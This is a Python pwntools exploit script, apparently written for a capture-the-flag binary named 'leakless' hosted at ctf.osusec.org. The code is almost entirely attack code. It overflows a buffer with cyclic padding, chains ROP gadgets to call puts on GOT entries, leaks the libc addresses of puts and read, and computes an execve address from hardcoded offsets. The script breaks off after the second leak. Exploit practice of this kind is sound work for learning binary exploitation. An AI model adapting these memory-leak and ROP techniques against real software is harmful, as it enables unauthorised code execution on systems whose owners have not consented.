#!/usr/bin/env python
from pwn import *



call_feedme = 0x804863a

p_p_p_ret = 0x80486b9
p_p_ret = 0x80486ba
p_ret = 0x80483ad

plt_read = 0x80483c0
plt_puts = 0x80483f0

got_puts = 0x804a018
got_read = 0x804a00c

buf = writable = 0x804a800
str_timeout = 0x80486e0

if len(sys.argv) < 2 :
    p = process("./leakless")
else :
    p = remote("ctf.osusec.org", sys.argv[1])

payload  = cyclic(cyclic_find("taaa"))
payload += p32(plt_puts) + p32(p_ret) + p32(str_timeout)
payload += p32(plt_puts) + p32(call_feedme) + p32(got_puts)
payload  = payload.ljust(0x100)
assert len(payload) <= 0x100


p.send(payload)
p.recvuntil("Timeout!\n")
leak = p.recvn(4)
print "libc.puts == " + hex(u32(leak))
libc_execve = u32(leak) + 0xf7e9a350 - 0xf7e43360


payload  = cyclic(cyclic_find("taaa"))
payload += p32(plt_puts) + p32(p_ret) + p32(str_timeout)
payload += p32(plt_puts) + p32(p_ret) + p32(got_read)

p.send(payload)
assert len(payload) <= 0x100

p.recvuntil("Timeout!\n")
leak = p.recvn(4)
print "libc.read == " + hex(u32(leak))


